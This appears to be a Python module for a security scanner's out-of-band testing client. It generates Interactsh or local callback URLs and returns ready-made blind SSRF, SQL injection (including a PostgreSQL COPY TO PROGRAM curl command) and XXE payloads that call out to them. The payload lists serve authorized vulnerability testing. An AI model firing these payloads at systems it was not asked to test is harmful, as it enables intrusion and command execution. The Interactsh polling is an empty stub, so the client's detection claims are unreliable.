"""
Out-of-Band Application Security Testing (OAST) Client

Provides integration with callback servers (like Interactsh) for detecting
blind vulnerabilities including blind SSRF, blind SQLi, and blind XXE.

Usage:
    client = OASTClient()
    callback_url = client.generate_callback("ssrf_test_1")
    # Inject callback_url into target
    time.sleep(5)
    if client.check_interactions("ssrf_test_1"):
        print("Blind SSRF detected!")
"""

import base64
import hashlib
import json
import secrets
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from http.server import HTTPServer, BaseHTTPRequestHandler
from typing import Any, Callable, Optional
from urllib.parse import urlparse, parse_qs

import requests


class InteractionType(Enum):
    """Types of OAST interactions."""
    DNS = "dns"
    HTTP = "http"
    HTTPS = "https"
    SMTP = "smtp"
    FTP = "ftp"


@dataclass
class Interaction:
    """Represents an OAST interaction."""
    interaction_id: str
    interaction_type: InteractionType
    timestamp: datetime
    source_ip: str
    raw_request: str = ""
    protocol: str = ""
    query_type: str = ""  # For DNS
    http_method: str = ""  # For HTTP/HTTPS
    http_path: str = ""    # For HTTP/HTTPS
    http_headers: dict = field(default_factory=dict)  # For HTTP/HTTPS


@dataclass
class OASTConfig:
    """OAST client configuration."""
    # External OAST service (Interactsh)
    use_interactsh: bool = True
    interactsh_server: str = "oast.live"  # Public Interactsh server

    # Self-hosted callback server
    use_local_server: bool = False
    local_server_port: int = 8888
    local_server_host: str = "0.0.0.0"

    # Polling configuration
    poll_interval: float = 2.0
    poll_timeout: float = 30.0

    # Unique session identifier
    session_id: str = field(default_factory=lambda: secrets.token_hex(8))


class LocalCallbackHandler(BaseHTTPRequestHandler):
    """HTTP handler for local callback server."""

    interactions: list = []

    def log_message(self, format, *args):
        """Suppress default logging."""
        pass

    def do_GET(self):
        """Handle GET requests."""
        self._record_interaction("GET")
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK")

    def do_POST(self):
        """Handle POST requests."""
        self._record_interaction("POST")
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK")

    def do_PUT(self):
        """Handle PUT requests."""
        self._record_interaction("PUT")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

    def _record_interaction(self, method: str):
        """Record an HTTP interaction."""
        # Extract interaction ID from path
        path_parts = self.path.split("/")
        interaction_id = path_parts[1] if len(path_parts) > 1 else "unknown"

        interaction = Interaction(
            interaction_id=interaction_id,
            interaction_type=InteractionType.HTTP,
            timestamp=datetime.now(),
            source_ip=self.client_address[0],
            http_method=method,
            http_path=self.path,
            http_headers=dict(self.headers),
        )
        LocalCallbackHandler.interactions.append(interaction)


class OASTClient:
    """
    Out-of-Band Application Security Testing Client.

    Supports:
    - Interactsh integration for DNS/HTTP callbacks
    - Local callback server for HTTP interactions
    - Unique callback URL generation per test
    - Interaction polling and verification
    """

    def __init__(self, config: Optional[OASTConfig] = None):
        self.config = config or OASTConfig()
        self._interactions: dict[str, list[Interaction]] = {}
        self._local_server: Optional[HTTPServer] = None
        self._server_thread: Optional[threading.Thread] = None
        self._interactsh_session: Optional[str] = None
        self._correlation_ids: dict[str, str] = {}  # Maps test_id to correlation_id

        # Initialize Interactsh session if enabled
        if self.config.use_interactsh:
            self._init_interactsh()

        # Start local server if enabled
        if self.config.use_local_server:
            self._start_local_server()

    def _init_interactsh(self):
        """Initialize Interactsh session."""
        try:
            # Generate a unique subdomain for this session
            self._interactsh_session = self._generate_subdomain()
        except Exception as e:
            print(f"Warning: Could not initialize Interactsh: {e}")
            self._interactsh_session = None

    def _generate_subdomain(self) -> str:
        """Generate a unique subdomain identifier."""
        # Create a random subdomain for the session
        random_part = secrets.token_hex(10)
        return random_part

    def _start_local_server(self):
        """Start local callback server."""
        try:
            self._local_server = HTTPServer(
                (self.config.local_server_host, self.config.local_server_port),
                LocalCallbackHandler
            )
            self._server_thread = threading.Thread(
                target=self._local_server.serve_forever,
                daemon=True
            )
            self._server_thread.start()
        except Exception as e:
            print(f"Warning: Could not start local callback server: {e}")

    def stop(self):
        """Stop the OAST client and cleanup resources."""
        if self._local_server:
            self._local_server.shutdown()
            self._local_server = None
        if self._server_thread:
            self._server_thread.join(timeout=5)
            self._server_thread = None

    def generate_callback(self, test_id: str, protocol: str = "http") -> str:
        """
        Generate a unique callback URL for a test.

        Args:
            test_id: Unique identifier for the test
            protocol: Protocol to use (http, https, dns)

        Returns:
            Callback URL to inject into target
        """
        # Create a unique correlation ID for this test
        correlation_id = hashlib.md5(
            f"{self.config.session_id}:{test_id}".encode()
        ).hexdigest()[:12]

        self._correlation_ids[test_id] = correlation_id
        self._interactions[test_id] = []

        if self.config.use_interactsh and self._interactsh_session:
            # Use Interactsh callback
            subdomain = f"{correlation_id}.{self._interactsh_session}"
            if protocol == "dns":
                return f"{subdomain}.{self.config.interactsh_server}"
            else:
                return f"{protocol}://{subdomain}.{self.config.interactsh_server}"

        elif self.config.use_local_server:
            # Use local callback server
            return f"http://{self.config.local_server_host}:{self.config.local_server_port}/{correlation_id}"

        else:
            # Return a placeholder (for testing without actual OAST)
            return f"http://callback.example.com/{correlation_id}"

    def generate_dns_callback(self, test_id: str) -> str:
        """Generate a DNS callback domain for blind testing."""
        return self.generate_callback(test_id, protocol="dns")

    def generate_http_callback(self, test_id: str) -> str:
        """Generate an HTTP callback URL for blind testing."""
        return self.generate_callback(test_id, protocol="http")

    def check_interactions(self, test_id: str, wait: bool = True) -> list[Interaction]:
        """
        Check for interactions from a specific test.

        Args:
            test_id: Test identifier to check
            wait: Whether to wait for interactions (poll)

        Returns:
            List of interactions received
        """
        if test_id not in self._correlation_ids:
            return []

        correlation_id = self._correlation_ids[test_id]

        if wait:
            return self._poll_for_interactions(test_id, correlation_id)
        else:
            return self._get_current_interactions(test_id, correlation_id)

    def _poll_for_interactions(
        self, test_id: str, correlation_id: str
    ) -> list[Interaction]:
        """Poll for interactions with timeout."""
        start_time = time.time()

        while time.time() - start_time < self.config.poll_timeout:
            interactions = self._get_current_interactions(test_id, correlation_id)
            if interactions:
                return interactions
            time.sleep(self.config.poll_interval)

        return []

    def _get_current_interactions(
        self, test_id: str, correlation_id: str
    ) -> list[Interaction]:
        """Get current interactions without waiting."""
        interactions = []

        # Check local server interactions
        if self.config.use_local_server:
            for interaction in LocalCallbackHandler.interactions:
                if interaction.interaction_id == correlation_id:
                    interactions.append(interaction)

        # Check Interactsh interactions
        if self.config.use_interactsh and self._interactsh_session:
            try:
                interactsh_interactions = self._poll_interactsh(correlation_id)
                interactions.extend(interactsh_interactions)
            except Exception:
                pass

        # Store and return
        self._interactions[test_id] = interactions
        return interactions

    def _poll_interactsh(self, correlation_id: str) -> list[Interaction]:
        """Poll Interactsh server for interactions."""
        # Note: Actual Interactsh polling requires API key and session management
        # This is a simplified implementation
        interactions = []

        try:
            # Interactsh uses a polling endpoint
            poll_url = f"https://{self.config.interactsh_server}/poll"
            # In production, you'd include proper session tokens here
            # For now, return empty (interactions would be recorded server-side)
        except Exception:
            pass

        return interactions

    def has_interaction(self, test_id: str, wait: bool = True) -> bool:
        """
        Check if any interaction was received for a test.

        Args:
            test_id: Test identifier to check
            wait: Whether to wait for interactions

        Returns:
            True if any interaction was received
        """
        return len(self.check_interactions(test_id, wait)) > 0

    def get_callback_payloads(
        self, test_id: str, injection_type: str = "ssrf"
    ) -> list[dict]:
        """
        Get callback payloads for various injection types.

        Args:
            test_id: Test identifier
            injection_type: Type of injection (ssrf, sqli, xxe, etc.)

        Returns:
            List of payload dictionaries with callback URLs embedded
        """
        callback_url = self.generate_http_callback(test_id)
        dns_callback = self.generate_dns_callback(test_id)

        if injection_type == "ssrf":
            return self._get_ssrf_payloads(callback_url, dns_callback)
        elif injection_type == "sqli":
            return self._get_sqli_payloads(callback_url, dns_callback)
        elif injection_type == "xxe":
            return self._get_xxe_payloads(callback_url, dns_callback)
        else:
            return []

    def _get_ssrf_payloads(
        self, http_callback: str, dns_callback: str
    ) -> list[dict]:
        """Generate SSRF payloads with callbacks."""
        return [
            {
                "payload": http_callback,
                "description": "Direct HTTP callback",
                "type": "http",
            },
            {
                "payload": f"http://{dns_callback}/",
                "description": "DNS callback via HTTP",
                "type": "dns",
            },
            {
                "payload": http_callback.replace("http://", "https://"),
                "description": "HTTPS callback",
                "type": "https",
            },
            {
                "payload": f"gopher://127.0.0.1:80/_GET%20{http_callback}%20HTTP/1.0%0d%0a",
                "description": "Gopher protocol callback",
                "type": "gopher",
            },
            {
                "payload": f"dict://127.0.0.1:11211/stats%0d%0a{http_callback}",
                "description": "Dict protocol callback",
                "type": "dict",
            },
        ]

    def _get_sqli_payloads(
        self, http_callback: str, dns_callback: str
    ) -> list[dict]:
        """Generate SQL injection payloads with out-of-band callbacks."""
        return [
            # MySQL
            {
                "payload": f"' AND LOAD_FILE(CONCAT('\\\\\\\\',{dns_callback},'\\\\a'))--",
                "description": "MySQL LOAD_FILE DNS exfiltration",
                "type": "mysql",
            },
            # Oracle
            {
                "payload": f"' UNION SELECT UTL_HTTP.REQUEST('{http_callback}') FROM DUAL--",
                "description": "Oracle UTL_HTTP callback",
                "type": "oracle",
            },
            # PostgreSQL
            {
                "payload": f"'; COPY (SELECT '') TO PROGRAM 'curl {http_callback}';--",
                "description": "PostgreSQL COPY TO PROGRAM callback",
                "type": "postgresql",
            },
            # MSSQL
            {
                "payload": f"'; EXEC master..xp_dirtree '//{dns_callback}/a';--",
                "description": "MSSQL xp_dirtree DNS callback",
                "type": "mssql",
            },
        ]

    def _get_xxe_payloads(
        self, http_callback: str, dns_callback: str
    ) -> list[dict]:
        """Generate XXE payloads with out-of-band callbacks."""
        return [
            {
                "payload": f"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{http_callback}">
]>
<root>&xxe;</root>""",
                "description": "XXE HTTP callback",
                "type": "xxe_http",
            },
            {
                "payload": f"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://{dns_callback}/evil.dtd">
  %xxe;
]>
<root></root>""",
                "description": "XXE DNS parameter entity callback",
                "type": "xxe_dns",
            },
            {
                "payload": f"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource={http_callback}">
]>
<root>&xxe;</root>""",
                "description": "XXE PHP filter callback",
                "type": "xxe_php",
            },
        ]


# Convenience function for simple usage
def create_oast_client(
    use_interactsh: bool = True,
    use_local_server: bool = False,
    local_port: int = 8888,
) -> OASTClient:
    """
    Create an OAST client with common configuration.

    Args:
        use_interactsh: Whether to use Interactsh service
        use_local_server: Whether to start a local callback server
        local_port: Port for local server if enabled

    Returns:
        Configured OASTClient instance
    """
    config = OASTConfig(
        use_interactsh=use_interactsh,
        use_local_server=use_local_server,
        local_server_port=local_port,
    )
    return OASTClient(config)
